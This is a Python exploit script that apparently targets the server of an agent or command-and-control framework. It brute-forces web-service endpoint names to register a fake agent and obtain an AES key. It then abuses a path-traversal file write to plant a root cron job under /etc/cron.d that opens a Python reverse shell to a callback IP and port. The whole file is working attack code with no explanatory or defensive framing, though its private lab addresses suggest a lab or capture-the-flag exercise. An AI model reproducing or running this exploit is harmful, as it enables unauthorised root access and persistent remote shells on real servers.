from Crypto.Cipher import AES
import requests
import os
import base64
import random

endpoints = ["ServiceDefinition", "admin", "atom", "axis", "context", "default", "disco", "extwsdl", "index", "inquire", "inquiryapi", "inspection", "interface", "interfaces", "jboss-net", "jbossws", "juddi", "manual", "methods", "name", "names", "operation", "operations", "oracle", "proxy", "publish", "publishing", "query", "rss", "service", "services", "svce", "uddi", "uddiexplorer", "uddigui", "uddilistener", "uddisoap", "webservice", "webserviceclient", "webserviceclient+ssl", "webservices", "ws", "ws4ee", "wsatom", "wsdl", "wsgw", "wsil", "xmethods"]

URL = "http://192.168.167.131:4343"
CALLBACK_IP = "192.168.167.1"
CALLBACK_PORT = "8888"
FILEPATH = "../../../../../../../../../../etc/cron.d/pwned"
DATA = f"""* * * * * root python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{CALLBACK_IP}",{CALLBACK_PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
"""

agent_id = random.randint(1,99999999)
register_payload = {'id':agent_id,'data':'${os}**${IP}**${arch}**${hostname}**${domain}**${whoami}**$pid&${random}=${agent}'}

def encrypt(b64_key, data):
    bkey = base64.b64decode(b64_key)
    iv = os.urandom(16)
    aes = AES.new(bkey, AES.MODE_CBC, iv)

    mod = len(data) % 16
    if mod != 0:
        newlen = len(data) + (16 - mod)
        data = data.ljust(newlen, ' ')
    out = aes.IV + aes.encrypt(data.encode())
    return base64.b64encode(out)

for register_url in endpoints:
    res = requests.post(URL + "/" + register_url,  data=register_payload)
    if res.status_code == 200 and len(res.text) == 44:
        print(f"Register endpoint found at /{register_url}")
        b64_key = res.text
        enc = encrypt(b64_key, DATA)

        for download_url in endpoints:
            download_payload = {'resource':agent_id,'d':enc, 'f': FILEPATH}
            res = requests.post(URL + "/" + download_url,  data=download_payload)
            if res.status_code == 200 and res.text == "OK":
                print(f"Download endpoint found at /{download_url}")
                print(f"Filepath {FILEPATH} written")
                break
        break
